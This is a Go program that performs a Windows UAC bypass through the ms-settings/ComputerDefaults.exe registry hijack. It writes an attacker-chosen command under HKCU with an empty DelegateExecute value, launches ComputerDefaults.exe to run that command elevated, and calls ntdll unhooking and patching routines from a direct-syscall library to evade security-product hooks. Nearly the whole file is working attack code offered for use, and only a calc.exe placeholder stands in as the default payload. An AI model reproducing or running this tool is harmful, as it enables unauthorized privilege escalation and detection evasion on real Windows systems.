package main

import (
	"flag"
	"fmt"
	"log"
	"os/exec"
	"strings"
	"unicode/utf16"
	"unsafe"

	winapi "github.com/carved4/go-direct-syscall"
)

const (
	KEY_ALL_ACCESS          = 0xF003F
	REG_SZ                  = 1
	REG_OPTION_NON_VOLATILE = 0x0
	REG_CREATED_NEW_KEY     = 0x1
	REG_OPENED_EXISTING_KEY = 0x2

	TokenUser                         = 1
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	TOKEN_QUERY                       = 0x0008

	// Configure this path to your desired executable for UAC bypass
	UAC_BYPASS_EXECUTABLE = `C:\Windows\System32\cmd.exe /c C:\Windows\System32\calc.exe`
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *UNICODE_STRING
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type SID_AND_ATTRIBUTES struct {
	Sid        uintptr
	Attributes uint32
}

type TOKEN_USER struct {
	User SID_AND_ATTRIBUTES
}

func NewUnicodeString(s string) *UNICODE_STRING {
	utf16Ptr := StringToUTF16(s)
	utf16Slice := (*[256]uint16)(unsafe.Pointer(utf16Ptr))[:]

	length := 0
	for i := 0; i < len(utf16Slice); i++ {
		if utf16Slice[i] == 0 {
			break
		}
		length++
	}

	return &UNICODE_STRING{
		Length:        uint16(length * 2),
		MaximumLength: uint16((length + 1) * 2),
		Buffer:        utf16Ptr,
	}
}

func NewObjectAttributes(objectName *UNICODE_STRING, rootDirectory uintptr) *OBJECT_ATTRIBUTES {
	return &OBJECT_ATTRIBUTES{
		Length:                   uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		RootDirectory:            rootDirectory,
		ObjectName:               objectName,
		Attributes:               0x40,
		SecurityDescriptor:       0,
		SecurityQualityOfService: 0,
	}
}

func UTF16PtrToString(p *uint16) string {
	if p == nil {
		return ""
	}

	length := 0
	ptr := unsafe.Pointer(p)
	for {
		if *(*uint16)(unsafe.Pointer(uintptr(ptr) + uintptr(length*2))) == 0 {
			break
		}
		length++
	}

	var us []uint16
	for i := 0; i < length; i++ {
		us = append(us, *(*uint16)(unsafe.Pointer(uintptr(ptr) + uintptr(i*2))))
	}

	return string(utf16.Decode(us))
}

func getCurrentUserSID() (string, error) {
	cmd := exec.Command("powershell", "-Command",
		"(Get-WmiObject -Class Win32_UserAccount | Where-Object {$_.Name -eq $env:USERNAME}).SID")

	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to execute WMI query: %v", err)
	}

	sid := strings.TrimSpace(string(output))

	if !strings.HasPrefix(sid, "S-1-") {
		return "", fmt.Errorf("invalid SID format: %s", sid)
	}

	fmt.Printf("Retrieved current user SID: %s\n", sid)
	return sid, nil
}

func main() {
	executablePathPtr := flag.String("exec", UAC_BYPASS_EXECUTABLE, "Path to the executable for UAC bypass")
	flag.Parse()
	winapi.UnhookNtdll()
	executablePath := *executablePathPtr

	fmt.Println("Starting UAC bypass...")
	fmt.Printf("Using executable: %s\n", executablePath)

	if err := createRegistryKey(executablePath); err != nil {
		log.Fatalf("Failed to create registry key: %v", err)
	}
	fmt.Println("Registry key created successfully")
	winapi.ApplyAllPatches()
	fmt.Println("Executing ComputerDefaults.exe...")
	if err := executeComputerDefaults(); err != nil {
		log.Fatalf("Failed to execute ComputerDefaults.exe: %v", err)
	}
	fmt.Println("ComputerDefaults.exe executed")

	fmt.Print("Do you want to cleanup the registry? (y/n): ")
	var response string
	fmt.Scanln(&response)
	if response == "y" || response == "Y" {
		if err := cleanupRegistry(); err != nil {
			log.Printf("Failed to cleanup registry: %v", err)
		} else {
			fmt.Println("Registry cleaned up successfully")
		}
	}

	fmt.Println("Querying process permissions...")

	processName := extractProcessName(executablePath)

	if err := checkProcessElevation(processName); err != nil {
		log.Printf("Failed to query process permissions: %v", err)
	}
}

func createRegistryKey(executablePath string) error {
	sid, err := getCurrentUserSID()
	if err != nil {
		return fmt.Errorf("failed to get current user SID: %v", err)
	}

	hkcuPath := `\Registry\User\` + sid

	fmt.Println("Attempting to open registry key:", hkcuPath)
	unicodeHKCUPath := NewUnicodeString(hkcuPath)
	hkcuObjAttrs := NewObjectAttributes(unicodeHKCUPath, 0)

	var hkcuHandle uintptr
	status, err := winapi.NtOpenKey(
		&hkcuHandle,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(hkcuObjAttrs)),
	)

	if err != nil {
		return fmt.Errorf("NtOpenKey (HKCU) failed: %v", err)
	}

	if status != 0 {
		return fmt.Errorf("NtOpenKey (HKCU) returned non-zero status: %s (0x%x)",
			winapi.FormatNTStatus(status), status)
	}

	defer func() {
		winapi.NtClose(hkcuHandle)
	}()

	keyPath := `Software\Classes\ms-settings\Shell\open\command`
	unicodeKeyPath := NewUnicodeString(keyPath)
	objAttrs := NewObjectAttributes(unicodeKeyPath, hkcuHandle)

	var keyHandle uintptr
	var disposition uintptr

	status, err = winapi.NtCreateKey(
		&keyHandle,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(objAttrs)),
		0,
		0,
		REG_OPTION_NON_VOLATILE,
		&disposition,
	)

	if err != nil {
		return fmt.Errorf("NtCreateKey failed: %v", err)
	}

	if status != 0 {
		return fmt.Errorf("NtCreateKey returned non-zero status: %s (0x%x)",
			winapi.FormatNTStatus(status), status)
	}

	defer func() {
		winapi.NtClose(keyHandle)
	}()

	defaultValueUTF16 := StringToUTF16(executablePath)

	defaultValueLength := 0
	utf16Slice := (*[512]uint16)(unsafe.Pointer(defaultValueUTF16))[:]
	for i := 0; i < len(utf16Slice); i++ {
		if utf16Slice[i] == 0 {
			break
		}
		defaultValueLength++
	}

	emptyName := NewUnicodeString("")
	status, err = winapi.NtSetValueKey(
		keyHandle,
		uintptr(unsafe.Pointer(emptyName)),
		0,
		REG_SZ,
		unsafe.Pointer(defaultValueUTF16),
		uintptr((defaultValueLength+1)*2),
	)

	if err != nil {
		return fmt.Errorf("NtSetValueKey (default) failed: %v", err)
	}

	if status != 0 {
		return fmt.Errorf("NtSetValueKey (default) returned non-zero status: %s (0x%x)",
			winapi.FormatNTStatus(status), status)
	}

	delegateExecute := ""
	delegateExecuteUTF16 := StringToUTF16(delegateExecute)
	delegateName := NewUnicodeString("DelegateExecute")

	status, err = winapi.NtSetValueKey(
		keyHandle,
		uintptr(unsafe.Pointer(delegateName)),
		0,
		REG_SZ,
		unsafe.Pointer(delegateExecuteUTF16),
		uintptr(2),
	)

	if err != nil {
		return fmt.Errorf("NtSetValueKey (DelegateExecute) failed: %v", err)
	}

	if status != 0 {
		return fmt.Errorf("NtSetValueKey (DelegateExecute) returned non-zero status: %s (0x%x)",
			winapi.FormatNTStatus(status), status)
	}

	return nil
}

func executeComputerDefaults() error {
	cmd := exec.Command("powershell", "-c", "start-process", `C:\Windows\System32\ComputerDefaults.exe`)
	return cmd.Start()
}

func cleanupRegistry() error {

	sid, err := getCurrentUserSID()
	if err != nil {
		return fmt.Errorf("failed to get current user SID: %v", err)
	}

	hkcuPath := `\Registry\User\` + sid
	unicodeHKCUPath := NewUnicodeString(hkcuPath)
	hkcuObjAttrs := NewObjectAttributes(unicodeHKCUPath, 0)

	var hkcuHandle uintptr
	status, err := winapi.NtOpenKey(
		&hkcuHandle,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(hkcuObjAttrs)),
	)

	if err != nil {
		return fmt.Errorf("NtOpenKey (HKCU) failed: %v", err)
	}

	if status != 0 {
		return fmt.Errorf("NtOpenKey (HKCU) returned non-zero status: %s (0x%x)",
			winapi.FormatNTStatus(status), status)
	}

	defer func() {
		winapi.NtClose(hkcuHandle)
	}()

	commandKeyPath := `Software\Classes\ms-settings\Shell\open\command`
	unicodeCommandKeyPath := NewUnicodeString(commandKeyPath)
	commandObjAttrs := NewObjectAttributes(unicodeCommandKeyPath, hkcuHandle)

	var commandKeyHandle uintptr
	status, err = winapi.NtOpenKey(
		&commandKeyHandle,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(commandObjAttrs)),
	)

	if err != nil {
		fmt.Printf("NtOpenKey (command) failed: %v - ms-settings may already be cleaned up\n", err)
		return nil
	}

	if status != 0 {
		fmt.Printf("NtOpenKey (command) returned non-zero status: %s (0x%x)\n",
			winapi.FormatNTStatus(status), status)
		return nil
	}

	defer winapi.NtClose(commandKeyHandle)

	emptyName := NewUnicodeString("")
	status, err = winapi.NtDeleteValueKey(
		commandKeyHandle,
		uintptr(unsafe.Pointer(emptyName)),
	)

	if err != nil {
		fmt.Printf("NtDeleteValueKey (default) failed: %v\n", err)
	} else if status != 0 {
		fmt.Printf("NtDeleteValueKey (default) returned non-zero status: %s (0x%x)\n",
			winapi.FormatNTStatus(status), status)
	} else {
		fmt.Println("Default value deleted successfully")
	}

	delegateName := NewUnicodeString("DelegateExecute")
	status, err = winapi.NtDeleteValueKey(
		commandKeyHandle,
		uintptr(unsafe.Pointer(delegateName)),
	)

	if err != nil {
		fmt.Printf("NtDeleteValueKey (DelegateExecute) failed: %v\n", err)
	} else if status != 0 {
		fmt.Printf("NtDeleteValueKey (DelegateExecute) returned non-zero status: %s (0x%x)\n",
			winapi.FormatNTStatus(status), status)
	} else {
		fmt.Println("DelegateExecute value deleted successfully")
	}

	delegateExecute := "{4ed3a719-cea8-4bd9-910d-e252f997afc2}"
	delegateExecuteUTF16 := StringToUTF16(delegateExecute)

	delegateExecuteLength := 0
	utf16Slice := (*[512]uint16)(unsafe.Pointer(delegateExecuteUTF16))[:]
	for i := 0; i < len(utf16Slice); i++ {
		if utf16Slice[i] == 0 {
			break
		}
		delegateExecuteLength++
	}

	status, err = winapi.NtSetValueKey(
		commandKeyHandle,
		uintptr(unsafe.Pointer(delegateName)),
		0,
		REG_SZ,
		unsafe.Pointer(delegateExecuteUTF16),
		uintptr((delegateExecuteLength+1)*2),
	)

	if err != nil {
		return fmt.Errorf("NtSetValueKey (restore DelegateExecute) failed: %v", err)
	}

	if status != 0 {
		return fmt.Errorf("NtSetValueKey (restore DelegateExecute) returned non-zero status: %s (0x%x)",
			winapi.FormatNTStatus(status), status)
	}

	fmt.Println("Registry restored successfully")
	return nil
}

func StringToUTF16(s string) *uint16 {
	if s == "" {
		nullTerm := uint16(0)
		return &nullTerm
	}

	runes := []rune(s)

	utf16Slice := make([]uint16, 0, len(runes)+1)

	for _, r := range runes {
		if r < 0x10000 {
			utf16Slice = append(utf16Slice, uint16(r))
		} else {
			r -= 0x10000
			high := uint16((r>>10)&0x3FF) + 0xD800
			low := uint16(r&0x3FF) + 0xDC00
			utf16Slice = append(utf16Slice, high, low)
		}
	}

	utf16Slice = append(utf16Slice, 0)

	return &utf16Slice[0]
}

func extractProcessName(execPath string) string {
	if execPath == "" {
		return ""
	}

	parts := strings.Fields(execPath)
	if len(parts) > 1 {

		execPath = parts[0]

		if strings.HasSuffix(strings.ToLower(execPath), "cmd.exe") ||
			strings.HasSuffix(strings.ToLower(execPath), "powershell.exe") {
			for _, arg := range parts[1:] {
				if strings.HasSuffix(strings.ToLower(arg), ".exe") {
					execPath = arg
					break
				}
			}
		}
	}

	path := execPath
	path = strings.ReplaceAll(path, "/", "\\")
	pathParts := strings.Split(path, "\\")
	filename := pathParts[len(pathParts)-1]

	if strings.Contains(filename, " ") {
		filename = strings.Split(filename, " ")[0]
	}
	filename = strings.Trim(filename, "\"`'")
	if !strings.HasSuffix(strings.ToLower(filename), ".exe") {
		filename += ".exe"
	}

	fmt.Printf("Extracted process name '%s' from path '%s'\n", filename, execPath)
	return filename
}

func checkProcessElevation(processName string) error {
	if strings.EqualFold(processName, "calc.exe") {
		processName = "Calculator.exe"
		fmt.Println("Using Calculator.exe instead of calc.exe for Windows 10+")
		fmt.Println("Calculator will never be elevated, if you run your own binary it will be!")
	}

	fmt.Println("Checking elevation status for:", processName)

	psCmd := fmt.Sprintf(`
		Get-Process -Name "%s" -ErrorAction SilentlyContinue | 
		Add-Member -Name Elevated -MemberType ScriptProperty -Value {
			if ($this.Name -in @('Idle','System')) {$null} 
			else {-not $this.Path -and -not $this.Handle}
		} -PassThru | 
		Format-Table Name,Elevated
	`, strings.TrimSuffix(processName, ".exe"))

	cmd := exec.Command("powershell", "-Command", psCmd)
	output, err := cmd.CombinedOutput()

	if err != nil {
		return fmt.Errorf("failed to check process elevation: %v (output: %s)", err, output)
	}

	fmt.Println("Process elevation status:")
	fmt.Println(string(output))

	return nil
}
